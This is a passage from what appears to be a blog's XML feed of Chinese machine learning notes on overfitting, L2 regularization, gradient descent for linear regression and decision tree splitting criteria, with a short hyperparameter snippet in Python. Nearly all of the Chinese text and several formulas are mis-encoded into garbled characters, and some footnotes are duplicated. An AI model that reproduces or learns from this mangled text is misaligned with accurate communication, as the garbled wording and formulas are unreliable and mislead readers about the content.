ï¼Œåœ¨æµ‹è¯•é›†ä¸Šçš„ç»“æœä¸å†å˜å¥½ã€‚<imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220422004852.png"alt="20220422004852" /></p></li></ol><p>å¸¸ç”¨ä¼˜åŒ–æ–¹æ³•æœ‰ Adamã€æ¢¯åº¦ä¸‹é™ï¼ˆGradient Descentï¼‰ç­‰ã€‚</p><h2 id="æ‰©å±•">æ‰©å±•</h2><h2 id="å‚è€ƒ">å‚è€ƒ</h2><p><ahref="https://www.zippia.com/advice/domain-knowledge/#:~:text=Domain%20knowledge%20is%20defined%20as,experts%20in%20a%20particular%20field.">DomainKnowledge: What Is It And Examples â€“ Zippia</a></p><aside id="footnotes" class="footnotes footnotes-end-of-document"role="doc-endnotes"><hr /><ol><li id="fn1"><p>Domain knowledge is defined as the knowledge of aspecific, specialized discipline, profession, or activity, in contrastto general knowledge. In other words, the term domain knowledge is usedto describe the knowledge of specialists or experts in a particularfield.<a href="#fnref1" class="footnote-back"role="doc-backlink">â†©ï¸</a></p></li><li id="fn2"><p>Domain knowledge is defined as the knowledge of aspecific, specialized discipline, profession, or activity, in contrastto general knowledge. In other words, the term domain knowledge is usedto describe the knowledge of specialists or experts in a particularfield.<a href="#fnref2" class="footnote-back"role="doc-backlink">â†©ï¸</a></p></li></ol></aside>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ¨¡å‹é€‰æ‹©-è¿‡æ‹Ÿåˆä¸æ­£åˆ™åŒ–</title>
      <link href="/blog/2021/07/15/ml/2.model_selection/"/>
      <url>/blog/2021/07/15/ml/2.model_selection/</url>
      
        <content type="html"><![CDATA[<h2 id="intro">intro</h2><p>å¦‚æœç¬¬ä¸€è½®æ¨¡å‹æ‹Ÿåˆæ•ˆæœä¸å¥½ï¼Œå‡­å€Ÿ domain knowledgeå¯¹ç»“æœçš„åˆ†æï¼Œå¯èƒ½å¯¹åˆå§‹æ¨¡å‹çŒœæµ‹ä¸æ°å½“æˆ–è€…å¯¹å…¶ä»–å½±å“å› ç´ ç¼ºä¹è€ƒè™‘ï¼Œéœ€è¦é‡æ–°è®¾è®¡æ¨¡å‹ã€‚</p><p>å›å½’é—®é¢˜çš„æŸå¤±å‡½æ•°æ˜¯å‡¸å‡½æ•°ï¼ˆconvexï¼‰ï¼Œæ„å‘³ç€ä¸€å®šä¼šæ‰¾åˆ°å…¨å±€æœ€ä¼˜è§£ã€‚ä½†æ˜¯ï¼Œå…¶å®ƒçš„æœºå™¨å­¦ä¹ é—®é¢˜ä¸­ï¼Œå¤šä¸ªå‚æ•°çš„æ¢¯åº¦ä¸‹é™å¯èƒ½ä¼šé™·å…¥å±€éƒ¨æœ€ä¼˜è§£ã€‚</p><p>é€‰æ‹©æ¨¡å‹æ—¶ï¼Œæ›´å€¾å‘äºé€‰æ‹©â€œå¹³æ»‘â€çš„æ¨¡å‹ã€‚å› ä¸ºå½“æ•°æ®æœ‰å™ªå£°å¹²æ‰°æ—¶ï¼Œè¶Šå¹³æ»‘çš„å‡½æ•°å—åˆ°å™ªå£°çš„å¹²æ‰°è¶Šå°ã€‚</p><h2 id="è¿‡æ‹Ÿåˆ">è¿‡æ‹Ÿåˆ</h2><p>è¶Šå¤æ‚çš„æ¨¡å‹æ‹¥æœ‰æ›´å¤§çš„å‡½æ•°é›†åˆç©ºé—´ï¼Œç†è®ºä¸Šç»è¿‡è®­ç»ƒéƒ½å¯ä»¥å¾—åˆ°å¥½çš„é¢„æµ‹èƒ½åŠ›ï¼Œä½†æ˜¯å–å†³äºæ¢¯åº¦ä¸‹é™çš„æ˜¯å¦èƒ½æ‰¾åˆ°äº†local minima. äº‹å®ä¸Šï¼Œ A more complex model does not always lead tobetter performance on testing data.This is<strong>Overfitting</strong>.</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220422103934.png"alt="20220422103934" /><figcaption aria-hidden="true">20220422103934</figcaption></figure><p>å¯ä»¥çœ‹åˆ°åœ¨æµ‹è¯•é›†ä¸­ï¼Œéšç€æ¨¡å‹å¤æ‚åŒ–ï¼Œå‰é¢è¯¯å·®åœ¨å‡å°ï¼Œä½†æ˜¯åé¢æ¨¡å‹è¶Šå¤æ‚ï¼Œæµ‹è¯•é›†è¯¯å·®è¶Šå¤§ã€‚è¶Šå¤æ‚çš„æ¨¡å‹ä¸ä¸€å®šåœ¨æµ‹è¯•é›†ä¸­æœ‰æ›´å¥½çš„ç»“æœã€‚è¿™ç§ç°è±¡å°±æ˜¯è¿‡æ‹Ÿåˆã€‚</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220422104209.png"alt="20220422104209" /><figcaption aria-hidden="true">20220422104209</figcaption></figure><p>è¿‡æ‹Ÿåˆçš„ä¸€ä¸ªè§£å†³æ–¹æ³•æ˜¯ä½¿ç”¨æ­£åˆ™åŒ–ï¼Œé€šè¿‡æ­£åˆ™åŒ–æ¥é™ä½æ¨¡å‹çš„æ³›åŒ–è¯¯å·®ã€‚</p><h2 id="æ­£åˆ™åŒ–">æ­£åˆ™åŒ–</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220422104404.png"alt="20220422104404" /><figcaption aria-hidden="true">20220422104404</figcaption></figure><p>æœ€åˆçš„ Loss å‡½æ•°é‡‡ç”¨ square errorï¼Œåªè€ƒè™‘äº† Prediction çš„ errorregularization ä¸»è¦æ˜¯åŠ ä¸Šä¸€é¡¹é¢å¤–çš„ termï¼Œè¿™é¡¹é¢å¤–çš„ term: <spanclass="math display">\[\lambda\sum_{\circ}\left(w_{i}\right)^{2}\]</span>ï¼ˆ<spanclass="math inline">\(lambda\)</span> ä¸ºè¶…å‚æ•°ï¼‰</p><p>æ­£åˆ™é¡¹çš„æ„ä¹‰ï¼š<span class="math inline">\(w_i\)</span>è¶Šå°ï¼Œè¯¥é¡¹è¶Šå°ï¼ŒLoss è¶Šå°ã€‚ å‚æ•° <spanclass="math inline">\(w_i\)</span> åå°ï¼Œå‡½æ•°æ›´å¹³æ»‘ï¼Œå‡½æ•°å€¼éš xå˜åŒ–çš„å˜åŒ–å¹…åº¦å°ï¼Œ å³ï¼š<span class="math inline">\(w_i\Delta{x}\)</span>è¶Šå°ã€‚å› æ­¤ï¼Œåœ¨å™ªå£°å½±å“è¾“å…¥æ—¶ï¼Œå¹³æ»‘å‡½æ•°å—åˆ°å™ªå£°çš„å½±å“æ›´å°ã€‚</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220422111202.png"alt="20220422111202" /><figcaption aria-hidden="true">20220422111202</figcaption></figure><p>é€šè¿‡è°ƒæ•´ <span class="math inline">\(\lambda\)</span>è¶…å‚æ•°ï¼Œå¾—ç»“æœå¦‚ä¸‹ï¼š <span class="math inline">\(\lambda\)</span>è¶Šå¤§ï¼Œfunction is more smootherï¼Œä½†æ˜¯åœ¨è®­ç»ƒé›†ä¸Šçš„è¯¯å·®è¶Šå¤§ï¼Œå› ä¸º <spanclass="math inline">\(\lambda\)</span>æˆ‘ä»¬å¯¹æ­£åˆ™é¡¹çš„è€ƒè™‘è¶Šå¤šï¼Œå¯¹æ‹Ÿåˆçš„è¯¯å·®é¡¹è€ƒè™‘è¶Šå°‘ã€‚ä½†æ˜¯ <spanclass="math inline">\(\lambda\)</span>è¶Šå¤§ï¼Œåœ¨æµ‹è¯•é›†ä¸Šçš„è¯¯å·®ä»å°åˆ°å¤§ï¼Œè¯´æ˜ä¸€å®šèŒƒå›´å†…æ›´å¹³æ»‘çš„å‡½æ•°å¯ä»¥æŠµæŠ—å™ªå£°ï¼Œä½†æ˜¯å¤ªè¿‡å¹³æ»‘çš„functionï¼Œæ‹Ÿåˆæ•ˆæœè¿‡å·®ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦é€‰æ‹©è°ƒæ•´ <spanclass="math inline">\(\lambda\)</span> è·å¾—ä½¿ loss æœ€å°çš„æ¨¡å‹ã€‚</p><p>æ³¨æ„ï¼šæ­£åˆ™åŒ–ä¸éœ€è¦è€ƒè™‘ biasï¼ˆbï¼‰ï¼Œå› ä¸º biaså¯¹å‡½æ•°çš„å¹³æ»‘ç¨‹åº¦æ²¡æœ‰è´¡çŒ®ï¼Œå®ƒä»…ä»…æ˜¯ä¸Šä¸‹ç§»åŠ¨ function è€Œå·²ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ¢¯åº¦ä¸‹é™</title>
      <link href="/blog/2021/07/15/ml/4.gradient_descent/"/>
      <url>/blog/2021/07/15/ml/4.gradient_descent/</url>
      
        <content type="html"><![CDATA[<h2 id="ç®€ä»‹">ç®€ä»‹</h2><p>æ±‚è§£çº¿æ€§å›å½’æ¨¡å‹å‡½æ•°æ±‚æå€¼ è§£æè§£æ ¹æ®ä¸¥æ ¼çš„æ¨å¯¼å’Œè®¡ç®—å¾—åˆ°ï¼Œæ˜¯æ–¹ç¨‹çš„ç²¾ç¡®è§£èƒ½å¤Ÿåœ¨ä»»æ„ç²¾åº¦ä¸‹æ»¡è¶³æ–¹ç¨‹ æ•°å€¼è§£é€šè¿‡æŸç§è¿‘ä¼¼è®¡ç®—å¾—åˆ°çš„è§£ èƒ½å¤Ÿåœ¨ç»™å®šçš„ç²¾åº¦ä¸‹æ»¡è¶³æ–¹ç¨‹å¸¸ç”¨çš„æ±‚æ•°å€¼è§£çš„æ–¹æ³•ï¼šæ¢¯åº¦ä¸‹é™æ³•</p><p>ä¸€å…ƒå‡¸å‡½æ•°æ±‚æå€¼ å¯¹äºè¿­ä»£æ³•æ¥è¯´ï¼š</p><ol type="1"><li>æ­¥é•¿è¿‡å°ï¼Œè¿­ä»£æ¬¡æ•°è¿‡å¤šï¼Œæ”¶æ•›æ…¢</li><li>æ­¥é•¿è¿‡å¤§ï¼Œäº§ç”Ÿéœ‡è¡ overshoot the minimumï¼ˆæ›´æ–° xæ—¶ï¼Œæ­¥é•¿å¤ªå¤§ï¼Œè·¨è¶Šäº†æœ€å°å€¼ï¼‰ éœ‡è¡ï¼š1. æ¥å›éœ‡è¡ï¼ŒæŒ¯å¹…è¶Šæ¥è¶Šå°ï¼Œæœ€ç»ˆæ”¶æ•›2. æ¥å›éœ‡è¡ï¼Œæ— æ³•æ”¶æ•›</li></ol><p>è®©æ­¥é•¿å’Œæ–œç‡ä¹‹é—´ä¿æŒæ­£æ¯”ä¾‹å…³ç³», <spanclass="math inline">\(\eta\)</span> æ˜¯ä¸€ä¸ªå¸¸æ•°ï¼Œç§°ä¸ºå­¦ä¹ ç‡ <spanclass="math inline">\(step = \eta\frac{df(x)}{dx}\)</span></p><p>è¶…å‚æ•°ï¼šåœ¨å¼€å§‹å­¦ä¹ ä¹‹å‰è®¾ç½®ï¼Œä¸æ˜¯é€šè¿‡è®­ç»ƒå¾—åˆ°çš„ï¼Œå­¦ä¹ ç‡å°±æ˜¯ä¸€ä¸ªè¶…å‚æ•°ã€‚</p><p>é€‰æ‹©ä¸€ç»„å¥½çš„è¶…å‚æ•°ï¼Œå¯ä»¥æé«˜å­¦ä¹ çš„æ€§èƒ½å’Œæ•ˆæœã€‚</p><p>ç¬¬ k+1 è½®è¿­ä»£å’Œç¬¬ k è½®è¿­ä»£çš„å…³ç³»å¼ï¼š<spanclass="math inline">\(x^{(k+1)}=x^{(k)}-\eta\frac{df(x)}{dx}\)</span></p><p>ä¼˜ç‚¹ï¼š</p><ol type="1"><li>è‡ªåŠ¨è°ƒèŠ‚æ­¥é•¿</li><li>è‡ªåŠ¨ç¡®å®šä¸‹ä¸€æ¬¡æ›´æ–°çš„æ–¹å‘</li><li>ä¿è¯æ”¶æ•›æ€§</li></ol><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16154310451785.jpg"alt="16154310451785" /> æ¢¯åº¦</p><ol type="1"><li>æ¨¡ä¸ºæ–¹å‘å¯¼æ•°çš„æœ€å¤§å€¼</li><li>æ–¹å‘ä¸ºå–å¾—æœ€å¤§æ–¹å‘å¯¼æ•°çš„æ–¹å‘</li></ol><p>åªè¦èƒ½å¤ŸæŠŠ<strong>æŸå¤±å‡½æ•°</strong>æè¿°æˆ<strong>å‡¸å‡½æ•°</strong>ï¼Œé‚£ä¹ˆå°±ä¸€å®šå¯ä»¥é‡‡ç”¨<strong>æ¢¯åº¦ä¸‹é™æ³•</strong>ï¼Œä»¥<strong>æœ€å¿«</strong>çš„é€Ÿåº¦æ›´æ–°<strong>æƒå€¼å‘é‡w</strong>ï¼Œæ‰¾åˆ°ä½¿æŸå¤±å‡½æ•°è¾¾åˆ°<strong>æœ€å°å€¼ç‚¹</strong>çš„ä½ç½®ã€‚</p><h2 id="ä¸€å…ƒçº¿æ€§å›å½’">ä¸€å…ƒçº¿æ€§å›å½’</h2><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16154312967312.jpg"alt="16154312967312" /> é¦–å…ˆï¼Œåˆ¤æ–­ä¸€å…ƒçº¿æ€§å›å½’çš„ Lossä¸ºå‡¸å‡½æ•°ï¼Œç„¶åé‡‡ç”¨æ¢¯åº¦ä¸‹é™æ³•ã€‚ <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16154314178291.jpg"alt="16154314178291" /></p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16154323224457.jpg"alt="16154323224457" /><figcaption aria-hidden="true">16154323224457</figcaption></figure><p>æ­¥éª¤ï¼š</p><ol type="1"><li>åŠ è½½æ ·æœ¬æ•°æ® xï¼Œy</li><li>è®¾ç½®è¶…å‚æ•°ï¼šå­¦ä¹ ç‡ï¼Œè¿­ä»£æ¬¡æ•°æ ¹æ®ç»éªŒåå¤å°è¯•ï¼ŒåŒæ—¶è§‚å¯Ÿç®—æ³•æ˜¯å¦æ”¶æ•›ï¼Œå¹¶è¾¾åˆ°æˆ‘ä»¬çš„è¦æ±‚ã€‚</li><li>è®¾ç½®æ¨¡å‹å‚æ•°åˆå€¼ Woï¼Œbo</li><li>è®­ç»ƒæ¨¡å‹ wï¼Œb</li><li>ç»“æœå¯è§†åŒ–</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è®¾ç½®è¶…å‚æ•°</span></span><br><span class="line">learn_rate = <span class="number">0.00001</span>  <span class="comment"># é€šå¸¸æ˜¯ä¸€ä¸ªå¾ˆå°çš„å¸¸æ•°</span></span><br><span class="line"><span class="built_in">iter</span> = <span class="number">100</span>  <span class="comment"># è¿­ä»£æ¬¡æ•°</span></span><br><span class="line"></span><br><span class="line">display_step = <span class="number">10</span>  <span class="comment"># è¾“å‡ºç»“æœçš„é—´éš”ï¼Œå®ƒä¸å±äºè¶…å‚æ•°ï¼Œå› ä¸ºå…¶å–å€¼å®Œå…¨ä¸å½±å“æ¨¡å‹è®­ç»ƒ,åªæ˜¯æ”¹å˜æ˜¾ç¤ºçš„æ•ˆæœ</span></span><br></pre></td></tr></table></figure><p>åœ¨çº¿æ€§å›å½’ä¸­,åˆå§‹å€¼çš„é€‰æ‹©å¹¶æ²¡æœ‰é‚£ä¹ˆé‡è¦,é€šå¸¸æƒ…å†µä¸‹æˆ‘ä»¬å°†å…¶è®¾ç½®ä¸º 0å³å¯.</p><h2 id="å¤šå…ƒçº¿æ€§å›å½’">å¤šå…ƒçº¿æ€§å›å½’</h2><h3 id="å½’ä¸€åŒ–æ ‡å‡†åŒ–">å½’ä¸€åŒ–/æ ‡å‡†åŒ–</h3><p>å½’ä¸€åŒ–/æ ‡å‡†åŒ–ï¼šå°†æ•°æ®çš„å€¼é™åˆ¶åœ¨ä¸€å®šçš„èŒƒå›´ä¹‹å†…ä½¿æ‰€æœ‰å±æ€§å¤„äºåŒä¸€ä¸ªèŒƒå›´ã€åŒä¸€ä¸ªæ•°é‡çº§ä¸‹æ›´å¿«æ”¶æ•›åˆ°æœ€ä¼˜è§£æé«˜å­¦ä¹ å™¨çš„ç²¾åº¦ åˆ†ä¸ºï¼šçº¿æ€§å½’ä¸€åŒ–ï¼Œæ ‡å‡†å·®å½’ä¸€åŒ–ï¼Œéçº¿æ€§æ˜ å°„å½’ä¸€åŒ–</p><ol type="1"><li>çº¿æ€§å½’ä¸€åŒ–ï¼šå¯¹åŸå§‹æ•°æ®çš„çº¿æ€§å˜æ¢ <span class="math inline">\(x^{*}=\frac{x-min}{max-min}\)</span> ç­‰æ¯”ä¾‹ç¼©æ”¾æ‰€æœ‰çš„æ•°æ®éƒ½è¢«æ˜ å°„åˆ°[0ï¼Œ1]ä¹‹é—´</li><li>æ ‡å‡†å·®å½’ä¸€åŒ–ï¼šå°†æ•°æ®é›†å½’ä¸€åŒ–ä¸º<strong>å‡å€¼ä¸º 0ï¼Œæ–¹å·®ä¸º 1</strong>çš„æ ‡å‡†æ­£æ€åˆ†å¸ƒ <span class="math inline">\(x^*=\frac{xä¸€\mu}{\sigma}\)</span></li><li>éçº¿æ€§æ˜ å°„å½’ä¸€åŒ–ï¼šå¯¹åŸå§‹æ•°æ®çš„éçº¿æ€§å˜æ¢ æŒ‡æ•°ã€å¯¹æ•°ã€æ­£åˆ‡</li></ol><h3id="ä½¿ç”¨æ¢¯åº¦ä¸‹é™æ³•æ±‚è§£å¤šå…ƒçº¿æ€§å›å½’">ä½¿ç”¨æ¢¯åº¦ä¸‹é™æ³•æ±‚è§£å¤šå…ƒçº¿æ€§å›å½’</h3><ol type="1"><li>åŠ è½½æ ·æœ¬æ•°æ® areaï¼Œroomï¼Œprice</li><li>æ•°æ®å¤„ç† å½’ä¸€åŒ–ï¼ŒXï¼ŒY</li><li>è®¾ç½®è¶…å‚æ•°ï¼šå­¦ä¹ ç‡ï¼Œè¿­ä»£æ¬¡æ•°</li><li>è®¾ç½®æ¨¡å‹å‚æ•°åˆå€¼ Wo(woï¼Œw1ï¼Œw2)</li><li>è®­ç»ƒæ¨¡å‹ W <span class="math inline">\(W^{k+1} = W^{k}-\etaX^{T}(XW-Y)\)</span> <span class="math display">\[\begin{aligned}\frac{\partial \text { Loss }}{\partial W} &amp;=X^{T}(X W-Y) \\W^{(k+1)} &amp;=W^{(k)}-\eta \frac{\partial\operatorname{Loss}(W)}{\partial W}\end{aligned}\]</span></li><li>ç»“æœå¯è§†åŒ– <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16154428462423.jpg"alt="16154428462423" /></li></ol>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è¥¿ç“œä¹¦ç¬¬å››ç« -å†³ç­–æ ‘</title>
      <link href="/blog/2021/07/15/ml/decision_tree/"/>
      <url>/blog/2021/07/15/ml/decision_tree/</url>
      
        <content type="html"><![CDATA[<h1 id="è¥¿ç“œä¹¦ç¬¬å››ç« ">è¥¿ç“œä¹¦ç¬¬å››ç« </h1><h2 id="åŸºæœ¬æµç¨‹">åŸºæœ¬æµç¨‹</h2><p>å†³ç­–æ ‘çš„æ¯ä¸€ä¸ªå¶å­ç»“ç‚¹è¡¨ç¤ºä¸€ä¸ªå†³ç­–ç»“æœï¼Œæ¯ä¸ªä¸­é—´èŠ‚ç‚¹è¡¨ç¤ºä¸€ä¸ªå±æ€§æµ‹è¯•ã€‚</p><p>å­¦ä¹ ç›®çš„ä¸ºç”Ÿæˆä¸€é¢—æ³›åŒ–èƒ½åŠ›å¼ºçš„å†³ç­–æ ‘ï¼ˆå¤„ç†æœªè§ç¤ºä¾‹èƒ½åŠ›å¼ºï¼‰</p><p>å†³ç­–æ ‘å­¦ä¹ çš„åŸºæœ¬è¿‡ç¨‹æ˜¯é€’å½’ä¸‹é™çš„åˆ’åˆ†è¿‡ç¨‹ï¼ŒèŠ‚ç‚¹å¯¹ç»™å®šçš„æ•°æ®é›†å’Œå±æ€§é›†å­¦ä¹ å¹¶å¾—åˆ°ä¸€ä¸ªåˆ’åˆ†æˆ–è€…å°†è‡ªå·±æ ‡è®°ä¸ºå¶å­ç»“ç‚¹ã€‚</p><h2 id="åˆ’åˆ†é€‰æ‹©">åˆ’åˆ†é€‰æ‹©</h2><p>å†³ç­–æ ‘å­¦ä¹ çš„å…³é”®æ­¥éª¤åœ¨äºé€‰æ‹©åˆé€‚çš„æœ€ä¼˜åˆ’åˆ†å±æ€§ã€‚</p><h3 id="ä¿¡æ¯å¢ç›Š">ä¿¡æ¯å¢ç›Š</h3><p>ä½¿ç”¨ä¿¡æ¯ç†µï¼ˆé¢‘ç‡è´Ÿå¯¹æ•°çš„æœŸæœ›ï¼‰æ¥åº¦é‡æ ·æœ¬é›†åˆçº¯åº¦ã€‚</p><p>ğ¸ğ‘›ğ‘¡(ğ·)=âˆ’âˆ‘|ğ‘¦|ğ‘˜=1ğ‘ğ‘˜ğ‘™ğ‘œğ‘”2ğ‘ğ‘˜ å€¼è¶Šå°è¡¨ç¤ºæ ·æœ¬é›†åˆ D çš„çº¯åº¦è¶Šé«˜ã€‚</p><p>å®šä¹‰ä¿¡æ¯å¢ç›Šï¼Œåº¦é‡ä½¿ç”¨å±æ€§ aå¯¹æ ·æœ¬è¿›è¡Œåˆ’åˆ†åçš„æ€§èƒ½æå‡ã€‚å…¶ä¸­åˆ’åˆ†åçš„å€¼ä¸ºå„ä¸ªå­èŠ‚ç‚¹çš„ä¿¡æ¯ç†µçš„åŠ æƒå’Œã€‚</p><p>ğºğ‘ğ‘–ğ‘›(ğ·,ğ‘)=ğ¸ğ‘›ğ‘¡(ğ·)âˆ’âˆ‘ğ‘‰ğ‘£=1|ğ·ğ‘£||ğ·|ğ¸ğ‘›ğ‘¡(ğ·ğ‘£)å€¼è¶Šå¤§è¡¨ç¤ºæå‡è¶Šå¤šã€‚</p><p>æ¯ä¸€æ¬¡åˆ’åˆ†æ—¶ï¼Œé€‰æ‹©ä¿¡æ¯å¢ç›Šæœ€å¤§çš„å±æ€§ç”¨äºåˆ’åˆ†ã€‚</p><h3 id="å¢ç›Šç‡">å¢ç›Šç‡</h3><p>ä¿¡æ¯å¢ç›Šå‡†åˆ™å¯¹äºå¯é€‰æ‹©å€¼æ•°ç›®æ›´å¤šçš„å±æ€§æœ‰æ‰€åå¥½ï¼Œä½¿ç”¨å¢ç›Šç‡é€‰æ‹©åˆ’åˆ†å±æ€§å¯å‡å°‘å…¶ä¸åˆ©å½±å“</p><p>ğºğ‘ğ‘–ğ‘›ğ‘Ÿğ‘ğ‘¡ğ‘–ğ‘œ(ğ·,ğ‘)=ğºğ‘ğ‘–ğ‘›(ğ·,ğ‘)ğ¼ğ‘‰(ğ‘) å…¶ä¸­å®šä¹‰äº†å±æ€§çš„å›ºæœ‰å€¼</p><p>ğ¼ğ‘‰(ğ‘)=âˆ’âˆ‘ğ‘‰ğ‘£=1|ğ·ğ‘£||ğ·|ğ‘™ğ‘œğ‘”2|ğ·ğ‘£||ğ·|ç”¨æ¥å‡å°‘å–å€¼æ•°ç›®çš„å½±å“ï¼Œä½†æ˜¯å¯¹å–å€¼æ•°ç›®è¾ƒå°‘çš„å±æ€§æœ‰æ‰€åå¥½</p><p>æŠ˜è¡·ï¼šå…ˆé€‰å‡ºä¿¡æ¯å¢ç›Šé«˜äºå¹³å‡æ°´å¹³çš„å±æ€§ï¼Œå†ä»ä¸­é€‰æ‹©å¢ç›Šç‡æœ€é«˜çš„</p><h3 id="åŸºå°¼æŒ‡æ•°">åŸºå°¼æŒ‡æ•°</h3><p>CART ç®—æ³•å®šä¹‰åŸºå°¼æŒ‡æ•°ç”¨äºåº¦é‡æ•°æ®é›†çš„çº¯åº¦</p><p>ğºğ‘–ğ‘›ğ‘–(ğ·)=1âˆ’âˆ‘[ğ‘Œ]ğ‘˜=1ğ‘2ğ‘˜ å®šä¹‰å±æ€§çš„åŸºå°¼æŒ‡æ•°</p><p><span class="math inline">\(Giniindex(D,a) =\sum{v=1}^{V}\frac{|D^v|}{|D|}Gini(D^v)\)</span></p><p>é€‰æ‹©ä½¿åˆ’åˆ†ååŸºå°¼æŒ‡æ•°æœ€å°çš„å±æ€§æ¥åˆ’åˆ†</p><h2 id="å‰ªæå¤„ç†">å‰ªæå¤„ç†</h2><p>ç”¨äºå¤„ç†è¿‡æ‹Ÿåˆçš„æƒ…å†µï¼Œå³å»æ‰ä¸€äº›åˆ†æ”¯é™ä½è¿‡æ‹Ÿåˆé£é™©ã€‚</p><p>é¢„å‰ªæï¼šåˆ’åˆ†ä¹‹å‰åˆ¤æ–­è¯¥æ¬¡åˆ’åˆ†èƒ½å¦æå‡æ€§èƒ½ã€‚</p><p>åå‰ªæï¼šå¯¹äºç”Ÿæˆçš„å†³ç­–æ ‘è‡ªåº•å‘ä¸Šåˆ¤æ–­éå¶èŠ‚ç‚¹èƒ½ä¸èƒ½æ¢ä¸ºå¶å­èŠ‚ç‚¹ã€‚</p><p>é¢„å‰ªæ æ¯æ¬¡åˆ’åˆ†ä¹‹å‰ï¼Œå¯¹äºåˆ’åˆ†å‰åçš„æ³›åŒ–æ€§èƒ½è¿›è¡Œä¼°è®¡</p><p>ä½¿ç”¨æ­£ç¡®ç‡ã€å‡æ­£ç‡/å‡åç‡ç­‰åœ¨éªŒè¯é›†ä¸Šè¿›è¡Œåˆ¤æ–­</p><p>ç²¾åº¦ä¸å˜ã€ç²¾åº¦é™ä½ã€å†…éƒ¨æ ·ä¾‹å·²ç»ä¸ºåŒä¸€ç±»æ—¶ï¼Œä¸è¿›è¡Œåˆ’åˆ†</p><p>åå‰ªæ å¯¹äºå·²ç»å¾—åˆ°çš„ä¸€é¢—å†³ç­–æ ‘ï¼Œè‡ªåº•å‘ä¸Šè€ƒè™‘æ¯ä¸€ä¸ªéå¶å­èŠ‚ç‚¹ã€‚</p><p>å¦‚æœä½¿ç”¨èŠ‚ç‚¹å–ä»£å­æ ‘åç²¾åº¦æé«˜æˆ–è€…ä¸å˜ï¼Œåˆ™è¿›è¡Œå‰ªæã€‚</p><p>åå‰ªæå¾—åˆ°çš„å†³ç­–æ ‘æ›´å°ä½†æ˜¯è®­ç»ƒæˆæœ¬é«˜ã€‚</p><h2 id="è¿ç»­ä¸ç¼ºå¤±å€¼">è¿ç»­ä¸ç¼ºå¤±å€¼</h2><p>è¿ç»­å±æ€§çš„å¤„ç† ä½¿ç”¨è¿ç»­å±æ€§ç¦»æ•£åŒ–æŠ€æœ¯</p><p>å¯¹äºæ•°æ®é›†ä¸­å–å€¼è¿ç»­çš„ Nä¸ªç‚¹ï¼Œé€‰æ‹©ç›¸é‚»ä¸¤ç‚¹çš„ä¸­ä½å€¼ä½œä¸ºä½œä¸ºå€™é€‰åˆ’åˆ†ç‚¹</p><p>é€šå¸¸å¯ä»¥å°†åˆ’åˆ†ç‚¹é€‰æ‹©ä¸ºæ•°æ®é›†ä¸­ä¸é«˜äºä¸­ä½ç‚¹çš„æœ€å¤§å€¼</p><p>æ³¨æ„ä½¿ç”¨è¿ç»­å€¼åˆ’åˆ†åï¼Œå­æ ‘ä¸­ä»ç„¶å¯ä½¿ç”¨åŒä¸€è¿ç»­å±æ€§</p><p>ç¼ºå¤±å€¼çš„å¤„ç† ç”±äºå­˜åœ¨ä¸å®Œæ•´æ ·æœ¬ï¼ŒæŸäº›æ ·æœ¬çš„æŸäº›å±æ€§å€¼ç¼ºå¤±</p><p>ï¼ˆ1ï¼‰å¦‚ä½•é€‰æ‹©åˆ’åˆ†å±æ€§ï¼ˆ2ï¼‰å¯¹äºä¸å®Œæ•´æ ·æœ¬å¦‚ä½•åœ¨è¯¥å±æ€§ä¸‹åˆ’åˆ†</p><p>é¦–å…ˆé€‰æ‹©åœ¨å±æ€§ a ä¸‹æ²¡æœ‰ç¼ºå¤±å€¼çš„æ ·æœ¬å­é›† ğ·Ìƒ ä»è€Œå¾—åˆ°å–å€¼ä¸º ğ‘ğ‘£ çš„å…ƒç´ ğ·ğ‘£~ å®šä¹‰ä¸€ç³»åˆ—å¸¸æ•°ï¼Œå¹¶å°†åŸæœ¬çš„å…¬å¼æ¨å¹¿å¾—åˆ° ğºğ‘ğ‘–ğ‘›(ğ·,ğ‘)=ğœŒÃ—ğºğ‘ğ‘–ğ‘›(ğ·Ìƒ,ğ‘)=ğœŒÃ—(ğ¸ğ‘›ğ‘¡(ğ·Ìƒ )âˆ’âˆ‘ğ‘ŸÌƒ ğ‘£ğ¸ğ‘›ğ‘¡(ğ·ğ‘£~))ã€ğ¸ğ‘›ğ‘¡(ğ·Ìƒ )=âˆ’âˆ‘ğ‘Ìƒ ğ‘˜ğ‘™ğ‘œğ‘”2ğ‘Ìƒ ğ‘˜ç›¸å½“äºå°†å±æ€§ç¼ºå¤±çš„æ ·æœ¬æŒ‰ä¸åŒæ¦‚ç‡åˆ’åˆ†åˆ°ä¸åŒçš„å­ç±»ä¸­</p><h2 id="å¤šå˜é‡å†³ç­–æ ‘">å¤šå˜é‡å†³ç­–æ ‘</h2><p>æ¯ä¸ªå±æ€§çœ‹ä½œä¸€ä¸ªåæ ‡è½´ï¼Œd ä¸ªå±æ€§å¾—åˆ° d ç»´ç©ºé—´çš„ä¸€ä¸ªæ•°æ®ç‚¹</p><p>åˆ†ç±»ä»»åŠ¡æ˜¯åˆ™ä¸ºå¯»æ‰¾åæ ‡ç©ºé—´çš„åˆ†ç±»è¾¹ç•Œ</p><p>å†³ç­–æ ‘å­¦ä¹ 